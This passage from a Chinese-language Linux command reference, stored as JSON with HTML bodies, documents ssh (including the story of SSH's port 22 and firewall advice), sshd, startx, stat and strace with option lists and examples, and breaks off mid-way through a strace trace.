class=\"hljs-deletion\">-f：后台执行ssh指令；</span>\n<span class=\"hljs-deletion\">-g：允许远程主机连接主机的转发端口；</span>\n<span class=\"hljs-deletion\">-i：指定身份文件；</span>\n<span class=\"hljs-deletion\">-l：指定连接远程服务器登录用户名；</span>\n<span class=\"hljs-deletion\">-N：不执行远程指令；</span>\n<span class=\"hljs-deletion\">-o：指定配置选项；</span>\n<span class=\"hljs-deletion\">-p：指定远程服务器上的端口；</span>\n<span class=\"hljs-deletion\">-q：静默模式；</span>\n<span class=\"hljs-deletion\">-X：开启X11转发功能；</span>\n<span class=\"hljs-deletion\">-x：关闭X11转发功能；</span>\n<span class=\"hljs-deletion\">-y：开启信任X11转发功能。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>远程主机：指定要连接的远程ssh服务器；</li>\n<li>指令：要在远程ssh服务器上执行的指令。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># ssh 用户名@远程服务器地址</span>\nssh user1<span class=\"hljs-variable\">@172</span>.<span class=\"hljs-number\">24.210</span>.<span class=\"hljs-number\">101</span>\n<span class=\"hljs-comment\"># 指定端口</span>\nssh -p <span class=\"hljs-number\">2211</span> root<span class=\"hljs-variable\">@140</span>.<span class=\"hljs-number\">206.185</span>.<span class=\"hljs-number\">170</span>\n\n<span class=\"hljs-comment\"># ssh 大家族</span>\nssh user<span class=\"hljs-variable\">@ip</span> -p22 <span class=\"hljs-comment\"># 默认用户名为当前用户名，默认端口为 22</span>\nssh-keygen <span class=\"hljs-comment\"># 为当前用户生成 ssh 公钥 + 私钥</span>\nssh-keygen -f keyfile -i -m key_format -e -m key_format <span class=\"hljs-comment\"># key_format: RFC4716/SSH2(default) PKCS8 PEM</span>\nssh-copy-id user<span class=\"hljs-variable\">@ip</span><span class=\"hljs-symbol\">:port</span> <span class=\"hljs-comment\"># 将当前用户的公钥复制到需要 ssh 的服务器的 ~/.ssh/authorized_keys，之后可以免密登录</span>\n</code></pre>\n<h3 id=\"背后故事\">背后故事</h3>\n<blockquote>\n<p>英文：Tatu Ylonen<br>编译：Linux中国/kenxx<br>来源：<a href=\"https://linux.cn/article-8476-1.html\">https://linux.cn/article-8476-1.html</a>  </p>\n</blockquote>\n<p>为什么 SSH（安全终端）的端口号是 22 呢，这不是一个巧合，这其中有个我（Tatu Ylonen，SSH 协议的设计者）未曾诉说的故事。</p>\n<h4 id=\"将-ssh-协议端口号设为-22-的故事\">将 SSH 协议端口号设为 22 的故事</h4>\n<p>1995 年春我编写了 SSH 协议的最初版本，那时候 telnet 和 FTP 正被广泛使用。</p>\n<p>当时我设计 SSH 协议想着是为了替代 telnet（端口 23）和 ftp（端口21）两个协议的，而端口 22 是空闲的。我想当然地就选择了夹在 telnet 和 ftp 的端口中间的数字。我觉得端口号虽然是个小事但似乎又存在着某种信念。但我到底要怎么拿到那个端口号呢？我未曾拥有过任何一个端口号，但我却认识几个拥有端口号的人！</p>\n<p>在那时取得端口号的事情其实说来挺简单的。毕竟当时的因特网（Internet）并不是很大，是因特网爆炸的早期。端口号分配的活儿是 IANA（Internet Assigned Numbers Authority，互联网数字分配机构）干的。在那时这机构可相当于是因特网先驱 <a href=\"https://en.wikipedia.org/wiki/Jon_Postel\">Jon Postel</a> 和 <a href=\"https://en.wikipedia.org/wiki/Joyce_K._Reynolds\">Joyce K. Reynolds</a> 一般的存在。Jon 参与编写了多项主要的协议标准，例如 IP（RFC 791）、ICMP（RFC 792）和 TCP（RFC 793）等一些你应该早有耳闻的协议。</p>\n<p>我可以说是敬畏 Jon 先生的，他参与编写了几乎所有主要的因特网标准文档（Internet RFC）！</p>\n<p>1995 年 7 月，就在我发布 ssh-1.0 前，我发送了一封邮件给 IANA：</p>\n<blockquote>\n<p>From ylo Mon Jul 10 11:45:48 +0300 1995<br>From: Tatu Ylonen<br>To: Internet Assigned Numbers Authority<br>Subject: 请求取得一个端口号<br>Organization: 芬兰赫尔辛基理工大学  </p>\n<p>亲爱的机构成员：</p>\n<p>我写了个可以在不安全的网络环境中安全地从一台机器登录到另一台机器的程序。它主要是对现有的 telnet 协议以及 rlogin 协议的功能性提升和安全性改进。说的具体些，就是可以防御 IP、DNS &gt; 或路由等欺骗行为。我打算将我的软件免费地发布在因特网上，以得到广泛地使用。</p>\n<p>我希望为该软件注册一个特权端口号，要是这个端口号在 1 到 255 &gt; 之间就更好了，这样它就可以用在名字服务器的 WKS 字段中了。</p>\n<p>我在附件中附上了协议标准的草案。这个软件已经在本地运行了几个月了，我已准备在获得端口号后就发布。如果端口号分配一事安排的及时，我希望这周就将要发布的软件准备好。我目前在 beta 版测试时使用的端口号是 &gt; 22，如果要是能够分配到这个端口，我就不用做什么更改了（目前这个端口在列表中还是空闲的）。</p>\n<p>软件中服务的名称叫 ssh（系 Secure Shell 的缩写）。</p>\n<p>您最真诚的，<br>Tatu Ylonen </p>\n</blockquote>\n<p>（LCTT 译注：DNS 协议中的 WKS 记录类型意即“众所周知的业务描述”，是类似于 A、MX 这样的 DNS 记录类型，用于描述某个 IP 所提供的服务，目前鲜见使用。参见： <a href=\"https://docs.oracle.com/cd/E19683-01/806-4077/dnsintro-154/index.html\">https://docs.oracle.com/cd/E19683-01/806-4077/dnsintro-154/index.html</a> 。）</p>\n<p>第二天，我就收到了 Joyce 发来的邮件：</p>\n<blockquote>\n<p>Date: Mon, 10 Jul 1995 15:35:33 -0700<br>From: <a href=\"mailto:jkrey@ISI.EDU\">jkrey@ISI.EDU</a><br>To: <a href=\"mailto:ylo@cs.hut.fi\">ylo@cs.hut.fi</a><br>Subject: 回复：请求取得一个端口号<br>Cc: <a href=\"mailto:iana@ISI.EDU\">iana@ISI.EDU</a><br>Tatu,<br>我们将端口号 22 分配给 ssh 服务了，你目前是该服务的主要联系人。<br>Joyce  </p>\n</blockquote>\n<p>这就搞定了！SSH 的端口正式使用 22！！！</p>\n<p>1995 年 7 月 12 日上午 2 点 21 分，我给我在赫尔辛基理工大学的测试者们宣布了 SSH 的最后 beta 版本。当日下午 5 点 23 分，我给测试者们宣布了 ssh-1.0.0 版本。1995 年 7 月 12 日，下午 5 点 51 分，我将一份 SSH（安全终端）的宣告发给了 <a href=\"mailto:cypherpunks@toad.com\">cypherpunks@toad.com</a> 的邮件列表，此外我还将其发给了一些新闻组、邮件列表和一些在因特网上讨论相关话题的人们。</p>\n<h4 id=\"如何更改-ssh-服务的端口号\">如何更改 SSH 服务的端口号</h4>\n<p>SSH 服务器是默认运行在 22 号端口上的。然而，由于某些原因需要，它也可以运行在别的端口上。比如为了方便测试使用，又比如在同一个宿主机上运行多个不同的配置。当然，极少情况下，不使用 root 权限运行它也可以，比如某些必须运行在非特权的端口的情况（端口号大于等于 1024）。</p>\n<p>端口号可以在配置文件 /etc/ssh/sshd_config 中将 Port 22 更改。也可以使用 -p  选项运行 sshd。SSH 客户端和 sftp 程序也可以使用 -p  选项。</p>\n<h4 id=\"配置-ssh-协议穿越防火墙\">配置 SSH 协议穿越防火墙</h4>\n<p>SSH 是少数通常被许可穿越防火墙的协议之一。通常的做法是不限制出站的 SSH 连接，尤其常见于一些较小的或者比较技术型的组织中，而入站的 SSH 连接通常会限制到一台或者是少数几台服务器上。</p>\n<h4 id=\"出站的-ssh-连接\">出站的 SSH 连接</h4>\n<p>在防火墙中配置出站的 SSH 连接十分简单。如果完全限制了外发连接，那么只需要创建一个允许 TCP 端口 22 可以外发的规则即可。如果你想限制目标地址，你可以限制该规则仅允许访问你的组织放在云端的外部服务器或保护该云端的跳板服务器即可。</p>\n<h4 id=\"反向通道是有风险的\">反向通道是有风险的</h4>\n<p>其实不限制出站的 SSH 连接虽然是可以的，但是是存在风险的，SSH 协议是支持 通道访问 的。最初的想法是在外部服务器搭建一个 SSH 服务监听来自各处的连接，将进入的连接转发到组织，并让这个连接可以访问某个内部服务器。</p>\n<p>在某些场景下这当然非常的方便。开发者和系统管理员经常使用它打开一个通道以便于他们可以远程访问，比如在家里或者在旅行中使用笔记本电脑等场景。</p>\n<p>然而通常来讲这些做法是违背安全策略的，跳过了防火墙管理员和安全团队保护的控制无疑是违背安全策略的，比如这些： PCI、HIPAA、NIST SP 800-53 等。它可以被黑客和外国情报机构用来在组织内留下后门。</p>\n<p>CryptoAuditor 是一款可以控制通道穿过防火墙或者一组云端服务器入口的产品。该款产品可以配合 通用 SSH 密钥管理器（Universal SSH Key Manager） 来获得对 主机密钥（host keys）的访问，以在启用防火墙并阻挡未授权转发的场景中解密 SSH 会话。</p>\n<h4 id=\"入站的-ssh-访问\">入站的 SSH 访问</h4>\n<p>对于入站访问而言，这里有几点需要说一下：</p>\n<p>配置防火墙，并转发所有去往 22 端口的连接只能流向到一个特定的内部网络 IP 地址或者一个 DMZ 主机。在该 IP 上运行 CryptoAuditor 或者跳板机来控制和审查所有访问该组织的连接。\n在防火墙上使用不同的端口访问不同的服务器。\n只允许使用 IPsec 协议这样的 VPN（虚拟专用网）登录后连接 SSH 服务。</p>\n<h4 id=\"通过-iptables-服务限制-ssh-访问\">通过 iptables 服务限制 SSH 访问</h4>\n<p>iptables 是一款内建在 Linux 内核的宿主防火墙。通常配置用于保护服务器以防止被访问那些未明确开启的端口。</p>\n<p>如果服务器上启用了 iptables，使用下面的命令将可以允许进入的 SSH 访问，当然命令需要以 root 身份运行。</p>\n<pre><code class=\"language-shell\">iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">22</span> -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT\niptables -<span class=\"hljs-selector-tag\">A</span> OUTPUT -<span class=\"hljs-selector-tag\">p</span> tcp --sport <span class=\"hljs-number\">22</span> -m conntrack --ctstate ESTABLISHED -j ACCEPT\n</code></pre>\n<p>如果你想将上述命令创建的规则持久地保存，在某些系统版本中，可使用如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">service iptables save</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "sshd",
        "des": "openssh软件套件中的服务器守护进程",
        "body": "<h1 id=\"sshd\">sshd</h1>\n<p>openssh软件套件中的服务器守护进程</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sshd命令</strong> 是openssh软件套件中的服务器守护进程。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">sshd</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-4：强制使用IPv4地址；</span>\n<span class=\"hljs-deletion\">-6：强制使用IPv6地址；</span>\n<span class=\"hljs-deletion\">-D：以后台守护进程方式运行服务器；</span>\n<span class=\"hljs-deletion\">-d：调试模式；</span>\n<span class=\"hljs-deletion\">-e：将错误发送到标准错误设备，而不是将其发送到系统日志；</span>\n<span class=\"hljs-deletion\">-f：指定服务器的配置文件；</span>\n<span class=\"hljs-deletion\">-g：指定客户端登录时的过期时间，如果在此期限内，用户没有正确认证，则服务器断开次客户端的连接；</span>\n<span class=\"hljs-deletion\">-h：指定读取主机key文件；</span>\n<span class=\"hljs-deletion\">-i：ssh以inetd方式运行；</span>\n<span class=\"hljs-deletion\">-o：指定ssh的配置选项；</span>\n<span class=\"hljs-deletion\">-p：静默模式，没有任何信息写入日志；</span>\n<span class=\"hljs-deletion\">-t：测试模式。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "startx",
        "des": "用来启动X Window",
        "body": "<h1 id=\"startx\">startx</h1>\n<p>用来启动X Window</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>startx命令</strong> 用来启动X Window，实际上启动X Window的程序为xinit。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">startx</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  客户端及选项：X客户端及选项；</li>\n<li>  服务器及选项：X服务器及选项。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>要在工作站上或 X 终端上启动 X 会话，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">startx</span>\n</code></pre>\n<p>要在工作站上强制启动 X 会话，请输入：&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">startx -w</span>\n</code></pre>\n<p>要为 X 终端启动 X 会话，并注销用户的 telnet 会话，请输入：</p>\n<pre><code class=\"language-shell\">startx; <span class=\"hljs-built_in\">kill</span> <span class=\"hljs-literal\">-9</span> <span class=\"hljs-variable\">$</span>\n</code></pre>\n<p>要使用 .xinitrc 脚本启动 X 会话，请输入：</p>\n<pre><code class=\"language-shell\">startx -x <span class=\"hljs-string\">.xinitrc</span>\n</code></pre>\n<p>要使用 mwm 窗口管理器启动 X 会话，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">startx -m mwm</span>\n</code></pre>\n<p>但是，如果找到启动脚本文件，则忽略<code>-w</code>选项。在启动脚本中，启动窗口管理器、装入X资源以及产生X客户机是用户的责任。以下是.xsession脚本的一个示例。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#!/bin/csh</span>\n (mwm &amp;)\n xrdb -load .Xdefaults\n (xclock -g 75x75+0+0 &amp;)\n (xbiff -g 75x75+101-0 &amp;)\n <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-string\">\"/dev/lft*\"</span> == <span class=\"hljs-string\">\"`tty`\"</span>) <span class=\"hljs-keyword\">then</span>\n  aixterm -g 80x24+0+0 +ut -C -T `hostname`\n <span class=\"hljs-keyword\">else</span>\n  aixterm -g 80x24+0+0 +ut -T `hostname`\n endif\n</code></pre>\n<p>对于工作站，startup脚本中的最后一行应该是前台aixterm命令，该命令带有<code>-C</code>选项表示控制台信息。对于X终端，startup脚本中的最后一行应该是不带有<code>-C</code>选项的前台aixterm命令。另外，由于某些X终端在关闭时不终止telnet会话，所以用户必须在使用热键切换至X会话前退出当前的telnet会话。</p>\n<p><code>/usr/lib/X11/xdm/Xsession</code>文件中的xdm命令也可以使用startx命令。这为xdm命令提供了startx命令的功能。</p>\n<p>以下是启动X会话一贯使用的文件名。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.xerrors 其中，startx 用来重定向错误消息。在缺省情况下，startx 将错误重定向至用户主目录中的 .xerrors 文件中。</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.Xinit,  </span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.xinit,  </span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.Xinitrc,  </span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.xinitrc,  </span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.xsession 作为包含 shell 命令的“启动文件”来启动窗口管理器、装入 X 资源并产生 X 客户机。</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.Xdefaults,  </span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.xresources 作为装入的 X 资源文件来设置 X 客户机的用户首选项。</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.mwmrc mwm 配置文件。</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.twmrc twm 配置文件。</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.awmrc awm 配置文件。</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$HOME</span>/.uwmrc uwm 配置文件。</span>\n/dev/lft* 终端或 tty、工作站初始 login shell 的界面。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "stat",
        "des": "用于显示文件的状态信息",
        "body": "<h1 id=\"stat\">stat</h1>\n<p>用于显示文件的状态信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>stat命令</strong> 用于显示文件的状态信息。stat命令的输出信息比ls命令的输出信息要更详细。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">stat</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-L：支持符号连接；</span>\n<span class=\"hljs-deletion\">-f：显示文件系统状态而非文件状态；</span>\n<span class=\"hljs-deletion\">-t：以简洁方式输出信息；</span>\n<span class=\"hljs-deletion\">--help：显示指令的帮助信息；</span>\n<span class=\"hljs-deletion\">--version：显示指令的版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要显示信息的普通文件或者文件系统对应的设备文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># ls -l myfile</span>\n<span class=\"hljs-string\">-rw-r--r--</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-string\">root</span> <span class=\"hljs-string\">root</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">2010-10-09 </span><span class=\"hljs-string\">myfile</span>\n\n[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># stat myfile</span>\n<span class=\"hljs-attr\">file:</span> <span class=\"hljs-string\">“myfile”</span>\n<span class=\"hljs-attr\">Size: 0               Blocks: 8          IO Block:</span> <span class=\"hljs-number\">4096</span>   <span class=\"hljs-string\">一般空文件</span>\n<span class=\"hljs-attr\">Device: fd00h/64768d    Inode: 194805815   Links:</span> <span class=\"hljs-number\">1</span>\n<span class=\"hljs-attr\">Access:</span> <span class=\"hljs-string\">(0644/-rw-r--r--)</span>  <span class=\"hljs-attr\">Uid:</span> <span class=\"hljs-string\">(</span>    <span class=\"hljs-number\">0</span><span class=\"hljs-string\">/</span>    <span class=\"hljs-string\">root)</span>   <span class=\"hljs-attr\">Gid:</span> <span class=\"hljs-string\">(</span>    <span class=\"hljs-number\">0</span><span class=\"hljs-string\">/</span>    <span class=\"hljs-string\">root)</span>\n<span class=\"hljs-attr\">Access:</span> <span class=\"hljs-number\">2010-12-12 12:22:35.000000000</span> <span class=\"hljs-string\">+0800</span>\n<span class=\"hljs-attr\">Modify:</span> <span class=\"hljs-number\">2010-10-09 20:44:21.000000000</span> <span class=\"hljs-string\">+0800</span>\n<span class=\"hljs-attr\">Change:</span> <span class=\"hljs-number\">2010-10-09 20:44:21.000000000</span> <span class=\"hljs-string\">+0800</span>\n\n[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># stat -f myfile</span>\n<span class=\"hljs-attr\">File:</span> <span class=\"hljs-string\">\"myfile\"</span>\n<span class=\"hljs-attr\">id: 0        Namelen: 255     type:</span> <span class=\"hljs-string\">ext2/ext3</span>\n<span class=\"hljs-attr\">Block size: 4096       Fundamental block size:</span> <span class=\"hljs-number\">4096</span>\n<span class=\"hljs-attr\">Blocks: Total: 241555461  free: 232910771  Available:</span> <span class=\"hljs-number\">220442547</span>\n<span class=\"hljs-attr\">Inodes: Total: 249364480  Free:</span> <span class=\"hljs-number\">249139691</span>\n\n[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># stat -t myfile</span>\n<span class=\"hljs-string\">myfile</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">8</span> <span class=\"hljs-string\">81a4</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-string\">fd00</span> <span class=\"hljs-number\">194805815</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">1292127755</span> <span class=\"hljs-number\">1286628261</span> <span class=\"hljs-number\">1286628261</span> <span class=\"hljs-number\">4096</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "strace",
        "des": "跟踪系统调用和信号",
        "body": "<h1 id=\"strace\">strace</h1>\n<p>跟踪系统调用和信号</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>strace命令</strong> 是一个集诊断、调试、统计与一体的工具，我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。当然strace与专业的调试工具比如说gdb之类的是没法相比的，因为它不是一个专业的调试器。</p>\n<p>strace的最简单的用法就是执行一个指定的命令，在指定的命令结束之后它也就退出了。在命令执行的过程中，strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">strace  [  -dffhiqrtttTvxx  ] [ -acolumn ] [ -eexpr ] ...\n    [ -ofile ] [-ppid ] ...  [ -sstrsize ] [ -uusername ]\n    [ -<span class=\"hljs-symbol\">Evar</span>=val ] ...  [ -<span class=\"hljs-symbol\">Evar</span>  ]...\n     [command [ arg ...  ] ]\n\nstrace  -c  [ -eexpr ] ...  [ -<span class=\"hljs-symbol\">Ooverhead</span> ] [ -<span class=\"hljs-symbol\">Ssortby</span> ]\n    [ command [ arg...  ] ]\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-c 统计每一系统调用的所执行的时间,次数和出错的次数等.\n-d 输出strace关于标准错误的调试信息.\n-f 跟踪由fork调用所产生的子进程.\n-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号.\n-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪.\n-h 输出简要的帮助信息.\n-i 输出系统调用的入口指针.\n-q 禁止输出关于脱离的消息.\n-r 打印出相对时间关于,,每一个系统调用.\n-t 在输出中的每一行前加上时间信息.\n-tt 在输出中的每一行前加上时间信息,微秒级.\n-ttt 微秒级输出,以秒了表示时间.\n-T 显示每一调用所耗的时间.\n-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出.\n-V 输出strace的版本信息.\n-x 以十六进制形式输出非标准字符串\n-xx 所有字符串以十六进制形式输出.\n-a column 设置返回值的输出位置.默认 为<span class=\"hljs-number\">40</span>.\n-e expr 指定一个表达式,用来控制如何跟踪.格式：[qualifier<span class=\"hljs-built_in\">=</span>][!]value1[,value2]...\nqualifier只能是 <span class=\"hljs-keyword\">trace</span>,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 <span class=\"hljs-keyword\">trace</span>.感叹号是否定符号.例如:-eopen等价于 -e <span class=\"hljs-keyword\">trace</span><span class=\"hljs-built_in\">=</span>open,表示只跟踪open调用.而-etrace!<span class=\"hljs-built_in\">=</span>open 表示跟踪除了open以外的其他调用.有两个特殊的符号 <span class=\"hljs-built_in\">all</span> 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\\\.\n-e <span class=\"hljs-keyword\">trace</span><span class=\"hljs-built_in\">=</span>set 只跟踪指定的系统 调用.例如:-e <span class=\"hljs-keyword\">trace</span><span class=\"hljs-built_in\">=</span>open,close,rean,write表示只跟踪这四个系统调用.默认的为set<span class=\"hljs-built_in\">=</span><span class=\"hljs-built_in\">all</span>.\n-e <span class=\"hljs-keyword\">trace</span><span class=\"hljs-built_in\">=</span>file 只跟踪有关文件操作的系统调用.\n-e <span class=\"hljs-keyword\">trace</span><span class=\"hljs-built_in\">=</span>process 只跟踪有关进程控制的系统调用.\n-e <span class=\"hljs-keyword\">trace</span><span class=\"hljs-built_in\">=</span>network 跟踪与网络有关的所有系统调用.\n-e strace<span class=\"hljs-built_in\">=</span>signal 跟踪所有与系统信号有关的 系统调用\n-e <span class=\"hljs-keyword\">trace</span><span class=\"hljs-built_in\">=</span>ipc 跟踪所有与进程通讯有关的系统调用\n-e abbrev<span class=\"hljs-built_in\">=</span>set 设定strace输出的系统调用的结果集.-v 等与 abbrev<span class=\"hljs-built_in\">=</span>none.默认为abbrev<span class=\"hljs-built_in\">=</span><span class=\"hljs-built_in\">all</span>.\n-e raw<span class=\"hljs-built_in\">=</span>set 将指定的系统调用的参数以十六进制显示.\n-e signal<span class=\"hljs-built_in\">=</span>set 指定跟踪的系统信号.默认为<span class=\"hljs-built_in\">all</span>.如 signal<span class=\"hljs-built_in\">=</span>!SIGIO(或者signal<span class=\"hljs-built_in\">=</span>!io),表示不跟踪SIGIO信号.\n-e read<span class=\"hljs-built_in\">=</span>set 输出从指定文件中读出 的数据.例如: -e read<span class=\"hljs-built_in\">=</span><span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">5</span>\n-e write<span class=\"hljs-built_in\">=</span>set 输出写入到指定文件中的数据.\n-o filename 将strace的输出写入文件filename\n-p pid 跟踪指定的进程pid.\n-s strsize 指定输出的字符串的最大长度.默认为<span class=\"hljs-number\">32</span>.文件名一直全部输出.\n-u username 以username的UID和GID执行被跟踪的命令\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>追踪系统调用</strong> </p>\n<p>现在我们做一个很简单的程序来演示strace的基本用法。这个程序的C语言代码如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># filename test.c</span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span>\n\n<span class=\"hljs-function\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span>\n</span>{\n    <span class=\"hljs-type\">int</span> a;\n    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">\"%d\"</span>, &amp;a);\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"%09d\\n\"</span>, a);\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n}\n</code></pre>\n<p>然后我们用<code>gcc -o test test.c</code>编译一下，得到一个可执行的文件test。然后用strace调用执行：</p>\n<pre><code class=\"language-shell\">strace ./<span class=\"hljs-built_in\">test</span>\n</code></pre>\n<p>执行期间会要求你输入一个整数，我们输入99，最后得到如下的结果：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">// 直接执行test的结果</span>\noracle<span class=\"hljs-meta\">@orainst</span>[orcl]:<span class=\"hljs-operator\">~</span> $<span class=\"hljs-operator\">./</span>test\n\n<span class=\"hljs-comment\">// 执行的结果</span>\n<span class=\"hljs-number\">99</span>\n<span class=\"hljs-number\">000000099</span>\n\n<span class=\"hljs-comment\">// 通过strace执行test的结果</span>\noracle<span class=\"hljs-meta\">@orainst</span>[orcl]:<span class=\"hljs-operator\">~</span> <span class=\"hljs-variable\">$strace</span> <span class=\"hljs-operator\">./</span>test\n\n<span class=\"hljs-comment\">// strace的trace结果</span>\nexecve(<span class=\"hljs-string\">\"./test\"</span>, [<span class=\"hljs-string\">\"./test\"</span>], [<span class=\"hljs-comment\">/* 41 vars */</span>]) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\nuname({sys<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">\"Linux\"</span>, node<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">\"orainst.desktop.mycompany.com\"</span>, <span class=\"hljs-operator\">...</span>}) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\nbrk(<span class=\"hljs-number\">0</span>)                                  <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0x8078000</span>\nfstat64(<span class=\"hljs-number\">3</span>, {st_mode<span class=\"hljs-operator\">=</span><span class=\"hljs-type\">S_IFREG</span><span class=\"hljs-operator\">|</span><span class=\"hljs-number\">0644</span>, st_size<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">65900</span>, <span class=\"hljs-operator\">...</span>}) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\nold_mmap(<span class=\"hljs-type\">NULL</span>, <span class=\"hljs-number\">65900</span>, <span class=\"hljs-type\">PROT_READ</span>, <span class=\"hljs-type\">MAP_PRIVATE</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">0</span>) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0xbf5ef000</span>\nclose(<span class=\"hljs-number\">3</span>)                                <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">open</span>(<span class=\"hljs-string\">\"/lib/tls/libc.so.6\"</span>, <span class=\"hljs-type\">O_RDONLY</span>)    <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">3</span>\nread(<span class=\"hljs-number\">3</span>, <span class=\"hljs-string\">\"\\177ELF\\1\\1\\1<span class=\"hljs-subst\">\\0</span><span class=\"hljs-subst\">\\0</span><span class=\"hljs-subst\">\\0</span><span class=\"hljs-subst\">\\0</span><span class=\"hljs-subst\">\\0</span><span class=\"hljs-subst\">\\0</span><span class=\"hljs-subst\">\\0</span><span class=\"hljs-subst\">\\0</span><span class=\"hljs-subst\">\\0</span>\\3<span class=\"hljs-subst\">\\0</span>\\3<span class=\"hljs-subst\">\\0</span>\\1<span class=\"hljs-subst\">\\0</span><span 